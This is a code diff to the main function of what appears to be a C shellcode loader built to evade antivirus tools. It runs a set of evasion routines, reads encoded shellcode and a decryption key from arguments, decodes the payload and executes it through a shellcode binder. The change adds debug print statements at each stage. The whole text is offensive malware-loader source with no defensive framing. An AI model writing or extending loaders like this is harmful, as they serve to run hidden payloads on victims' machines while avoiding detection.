@@ -74,7 +74,8 @@ int main (int argc, char **argv)
 		
 	// Execute evasion functions
 	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
-		if(evasion_functions[i] != NULL) {			
+		if(evasion_functions[i] != NULL) {	
+			DEBUG_PRINT(("Executing evasion function %d.\n", i));
 			evasion_functions[i]("");
 		}
 	}	
@@ -82,17 +83,30 @@ int main (int argc, char **argv)
 	// Retrieve encoded shellcode
 	int shellcode_size = 0;
 	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
+	if(encoded_shellcode != NULL) {
+		DEBUG_PRINT(("Retrieved shellcode data, size is %d bytes.\n", shellcode_size));
+	} else {
+		DEBUG_PRINT(("No shellcode retrieved.\n"));
+	}
 	
 	// Retrieve crypto key
 	int key_length = 0;
 	unsigned char *key = get_key(argv[2], &key_length);
-	
+	if(key != NULL) {
+		DEBUG_PRINT(("Retrieved key data, key length is %d bytes.\n", key_length));
+	} else {
+		DEBUG_PRINT(("No key retrieved.\n"));
+	}
+		
 	// Decode shellcode
 	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
+	DEBUG_PRINT(("Calling decode_shellcode...\n"));
 	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
-	
+		
 	// Bind and execute shellcode
+	DEBUG_PRINT(("Calling shellcode_binder...\n"));
 	shellcode_binder(shellcode);
 	
+	DEBUG_PRINT(("Execution finished.\n"));
 	return 0;
 }
